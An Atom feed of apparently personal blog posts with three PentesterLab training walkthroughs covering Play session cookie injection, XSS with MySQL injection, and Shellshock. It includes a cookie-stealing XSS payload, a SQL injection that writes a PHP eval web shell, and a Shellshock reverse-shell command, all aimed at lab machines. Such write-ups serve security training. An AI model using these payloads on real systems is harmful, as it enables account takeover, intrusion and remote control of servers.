<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Pentesterlab | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/pentesterlab/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-05-10T03:43:10-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Play Session Injection]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-play-session-injection/"/>
    <updated>2015-05-09T07:34:13-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-play-session-injection</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit XSS and SQL injection vulnerabilities. More information and ISO download please check <a href='https://ptl.io/play_session_injection.iso'>here</a>. The <a href='https://www.pentesterlab.com/exercises/play_session_injection/course'>official course</a> is highly recommanded to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficaulty: 3 / 5</p>

<h2>Links</h2>


<p>watch video online:
<iframe src='http://player.vimeo.com/video/103324009?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Interacted with the web server, found the (Cross Site Script) XSS vulnerable point. [Firefox]</li>
<li>Register two new accounts which username are test and test2, analyze both session cookies to figure out the cookie’s construction rules. Inject evil codes into the session cookie to bypass the validation schedule. [firebug / Burp proxy]</li>
<li>For goal one, inject “admin:1” to login with administration privilege. For goal two, inject “user:admin1” to login as admin user “admin1” with administration privilege. [Burp proxy]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://getfirebug.com/'>Firebug</a></li>
<li><a href='http://portswigger.net/burp/'>Burp suite</a></li>
</ul>


<h2>Walkthrough</h2>


<p>By reading the training <a href='https://www.pentesterlab.com/exercises/play_session_injection/course'>pdf</a>, we know that there is a session injection in Play framework. (In this exercise, we have two goals to achieve. First one is to login as anyone but have administration privilege; Second one is to login as administrator name is “admin1”).</p>

<h3>Find the Play session cookie</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. Upon viewing the page, the attacker know that this there are two goals need to be achieved. First one is create a user with admin privilege and the second one is to login as the user “admin1”. On the top left hand side, is the navigation menu to “Register”(which asks the attacker to register a new account), “Login”(which asks the attacker to login). The attacker tried to register a new account which the name is “test”, then run Burp proxy and login with the “test” account. After checking the request intercepted by Burp proxy, the attacker found that the session information is saved in the cookie called “PLAY_SESSION”. The cookie value is in the following format:<br>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PLAY_SESSION=xxx(some hash code)xxx%00&lt;strong>AT%3Axxx(authenticityToken)xxx%00%00user%3Atest%00</span></code></pre></td></tr></table></div></figure>
In order to analyze the session cookie, the attacker register another new account which name is &ldquo;test2&rdquo; and the session cookie value is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PALY_SESSION=xxx(some hash code)xxx%00&lt;/strong>AT%3Axxx(authenticityToken)xxx%00%00user%3Atest2%00</span></code></pre></td></tr></table></div></figure>
Here we can see that the username would be an injection point. And the encoding format is “<font color='blue'>%00key%3Avalue%00</font>” (here %3A is URL encoded “:” and %00 means NULL for termination).</p>

<h3>First goal is to login as anyone but have admin privilege</h3>


<p>In order to login as any user (here the attacker choose user “test2”) with admin privilege, the attacker have to inject evil code into the Play session. As we found that username is an injection point in the session, the attacker need to construct the Play session like this:</p>

<p><font color='blue'>PLAY_SESSION=xxx(hash code)xxx%00__AT%3Axxx(authenticityToken)xxx%00%00user%3A<font color='red'>test2%00%00admin%3A1</font>%00</font></p>


<p>Here admin%3A1 means “admin:1” which usually indicates admin privilege). In order to construct the above Play session, the attacker have to register a new account which user name is “<font color='red'>test2%00%00admin%3A1</font>”. (note: Burp proxy is needed here to fulfill this injection.</p>

<h3>Second goal is to login as admin user “admin1”</h3>


<p>Same as above, in order to login as admin user “admin1”, the attacker have to inject evil code into the Play session. The attacker need to construct the Play session like this:</p>

<p><font color='blue'>PLAY_SESSION=xxx(hash code)xxx%00__AT%3Axxx(authenticityToken)xxx%00%00user%3A<font color='red'>test2%00%00user%3Aadmin1</font>%00</font></p>


<p></p>

<p>In order to construct the above Play session, the attacker have to register a new account which user name is “<font color='red'>test2%00%00user%3Aadmin1</font>”. (note: Burp proxy is needed here to fulfill this injection)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] XSS and MySQL File]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-xss-and-mysql-file/"/>
    <updated>2015-05-09T01:28:19-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-xss-and-mysql-file</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit XSS and SQL injection vulnerabilities. More information and ISO download please check <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file'>here</a>. The <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file/course'>official course</a> is highly recommanded to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficaulty: 2 / 5</p>

<h2>Links</h2>


<p>watch video online:
<iframe src='http://player.vimeo.com/video/114390804?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering [whatweb]</li>
<li>Web file system structure detection [DirBuster]</li>
<li>Interacted with the web server, found the (Cross Site Script) XSS vulnerable point. [Firefox]</li>
<li>Set up the attacker’s server in order to Exploit the XSS vulnerability and get admin session cookie. [socat]</li>
<li>After obtain the admin session cookie, log in as administrator and then found SQL injection vulnerable point.</li>
<li>Exploit SQL injection to upload web shell.</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='http://www.morningstarsecurity.com/research/whatweb'>whatweb</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://www.dest-unreach.org/socat/'>socat</a></li>
</ul>




<h2>Walkthrough</h2>


<p>By reading the official course <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file/course'>pdf</a>, we know that we need to find and exploit a XSS vulnerability to log in as admin. After that, we need to find and exploit a MySQL injection vulnerability in order to upload webshell and control the target server.</p>

<h3>Find and Exploit the XSS vulnerability</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. Upon viewing the page, the attacker know that there are two goals need to be achieved. First one is log in as administrator and then upload webshell into the target server.</p>

<p>After browsing around the target web site, the attacker found the comment system might be vulnerable to XSS. The attacker try to test if there are XSS vulnerability by using &ldquo;<font color='red'>1337′&rdquo;>&lt;</font>“. The result is a little excited. the server end dose not filter special characters. So the attacker just exploit the XSS and obtain the cookie with admin privilege.</p>

<p>write the following XSS exploit code into the comments:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;http://192.168.1.129/?&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">+</span><span class="s1">&#39;&quot;/&gt;&#39;</span><span class="p">);</span> <span class="nt">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Set up the attacker’s machine to listen port 80 by using followed socat command.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>socat TCP-LISTEN:80,reuseaddr,fork –
</span></code></pre></td></tr></table></div></figure></p>

<p>The attacker will receive admin session cookie as soon as the administrator open the comments page.</p>

<h3>Exploit MySQL injection vulnerability and uploading webshell</h3>


<p>SQL Injection point:</p>

<p><font color='red'>http://192.168.1.149/admin/edit.php?id=2</font></p>


<p>Try single quote:</p>

<p><font color='red'>http://192.168.1.149/admin/edit.php?id=2′</font></p>


<p>Results:<br>
Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in <font color='red'>/var/www/classes/post.php</font> on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115</p>

<p>Now the attacker know the target web site’s absolute path is “/var/www/”</p>

<p>Detect backend DB information</p>

<p>
attacking code:<br>
http://192.168.1.149/admin/edit.php?id=2 order by 4 — – (OK)<br>
http://192.168.1.149/admin/edit.php?id=2 order by 5 — – (ERROR)<br><br>
http://192.168.1.149/admin/edit.php?id=-2 union select 1,@@version,user(),4
</p>


<p>Results:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Mysql Version: 5.1.72-2
</span><span class='line'>current DB user: root@localhost</span></code></pre></td></tr></table></div></figure></p>

<p>Due to MySQL is now runnnig by root, the attacker will grain root privilege.</p>

<p>Then the attacker is going to upload webshell.</p>

<p>attacking code：
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2">http://192.168.1.149/admin/edit.php?id=-2&lt;/a> union select 1,2,&ldquo;&lt;?php @eval($_POST[&lsquo;chopper&rsquo;])?>&rdquo;,4 into outfile &ldquo;/var/www/css/t2.php&rdquo; — –</span></code></pre></td></tr></table></div></figure>
attacking code(URL encoded)：
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-e">http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-e&lt;/a></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] CVE-2014-6271/Shellshock]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/07/pentesterlab-cve-2014-6271-slash-shellshock/"/>
    <updated>2015-05-07T07:33:16-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/07/pentesterlab-cve-2014-6271-slash-shellshock</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit CVE-2014-6271 [Shellshock] vulnerability. More information and ISO download please check <a href='https://www.pentesterlab.com/exercises/cve-2014-6271'>here</a>. The <a href='https://www.pentesterlab.com/exercises/cve-2014-6271/course'>official course</a> is highly recommanded to read, which explains how the bug works and the ways to exploit it for different purposes.</p>

<p>Difficaulty: 1 / 5</p>

<h2>Links</h2>


<p>watch video online:
<iframe src='http://player.vimeo.com/video/127037311?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>By checking source code of the web page and found hidden path &#8220;/cgi-bin/status&#8221; [firefox]</li>
<li>Test and Exploit shellshock vulnerability to get reverse shell and ROOT [nc]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://netcat.sourceforge.net/'>nc</a></li>
</ul>




<h2>Walkthrough</h2>


<p>This is a pretty easy one and not much things to talk. In according to we already know the server is vulnerable to ShellShock (CVE-2014-6271), so all we need to do just find the target machine, test if the vulnerability still works and exploit it to get a shell.</p>

<h3>Find and Exploit the ShellShock vulnerability</h3>


<p>After found the IP address of target server, and based on the result of Nmap scan, the attacker discovered apache is running and listening on TCP port 80.</p>

<p><img src="/downloads/shellshock/1.png"></p>

<p>Then the attacker interacted with the web server, by using “Firefox” browser to graphically render the web application on the target. By checking the source code, the attacker found the CGI page which calls system command (“/cgi-bin/status”).</p>

<p><img class="left" src="/downloads/shellshock/2.png"></p>

<p>After found the CGI page, the attacker use &ldquo;wget&rdquo; to test if there is ShellShock vulnerability in this CGI page.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U &ldquo;() { test;};echo \"Content-type: text/plain\&rdquo;; echo; /bin/bash -c &lsquo;echo vulnerable&rsquo;&ldquo; &lt;a href="http://10.10.10.129/cgi-bin/status">http://10.10.10.129/cgi-bin/status&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/shellshock/3.png"></p>

<p>As we can see above, the command &ldquo;echo vulnerable&rdquo; has been executed by the server, so it is vulnerable to ShellShock.</p>

<p>Now it is time to exploit it. The attacker set up NC listen on port 5555 and send the following command to exploit for getting a reverse shell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U &ldquo;() { test;};echo \"Content-type: text/plain\&rdquo;; echo; /bin/bash -i >&amp; /dev/tcp/10.10.10.131/5555 0>&amp;1" &lt;a href="http://10.10.10.129/cgi-bin/status">http://10.10.10.129/cgi-bin/status&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/shellshock/4.png"></p>

<p>Due to pentesterlab is belong to sudoers group, so it is easy to get ROOT through &ldquo;sudo&rdquo; command.</p>

<p><img src="/downloads/shellshock/5.png"></p>

<p>Game over :)</p>

<h2>Reference</h2>


<p>For more information about shell shock/bash bug, the following links have already given out good explaination.</p>

<p>[1] <a href="http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability">http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability</a><br>
[2] <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited</a><br>
[3] <a href="https://blog.cloudflare.com/inside-shellshock/">https://blog.cloudflare.com/inside-shellshock/</a><br></p>
]]></content>
  </entry>
  
</feed>
